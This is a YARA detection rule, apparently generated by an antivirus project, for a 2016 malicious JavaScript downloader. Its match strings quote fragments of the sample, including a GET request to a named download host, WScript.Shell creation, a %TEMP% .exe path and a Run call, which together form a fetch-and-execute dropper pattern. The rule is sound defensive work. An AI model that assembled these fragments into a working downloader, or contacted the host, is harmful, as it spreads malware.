rule sig_20160330_2168d4c49229b4556bcb6e26367ec12a {
  meta:
    description = "datamaliciousorder - file 20160330_2168d4c49229b4556bcb6e26367ec12a.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "aa9b2cdac96c3efe9a218f65215f2eecce94dd7992b19fc4b1e22290d2ebaa9a"

  strings:
    $s1  = "_BM[_JK](\"GET\", \"http://goldish.dk/o2pds\", false);" fullword ascii
    $s2  = "var _CN = function _HZ() {return WScript[_V](\"WScript\"+\".Shell\");}(), _Y0 = 11;" fullword ascii
    $s3  = "function _C(_G, _U0){_PG = _PG * 1; return _G - _U0;};" fullword ascii
    $s4  = "if (_BM[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _CY() {return _CN[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"BoNG0Rvj0.ex\" + \"e\";};" fullword ascii
    $s6  = "function _BG(){return _Y + \"\";};" fullword ascii
    $s7  = "function _D() {return ((_J0 == true) && (_J0 == _N)) ? 1 : _PG;};" fullword ascii
    $s8  = "function _HI(_YR){_CN[\"Run\"](_YR, _PG, _PG);};" fullword ascii
    $s9  = "function _DB(){return _V;};" fullword ascii
    $s10 = "function _UH(){return 22;};" fullword ascii
    $s11 = "function _CR(_W) {var _D0 = (1, 2, 3, 4, 5, _W); return _D0;};" fullword ascii
    $s12 = "var _CI = new this[\"Date\"]();" fullword ascii
    $s13 = " while (_E){" fullword ascii
    $s14 = "return _C(_II, _UN);" fullword ascii
    $s15 = "function _B()" fullword ascii
    $s16 = "_J0 = true; " fullword ascii
    $s17 = "var _J0 = false;" fullword ascii
    $s18 = "var _N = false;" fullword ascii
    $s19 = "var _EN = false;" fullword ascii
    $s20 = "_N = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}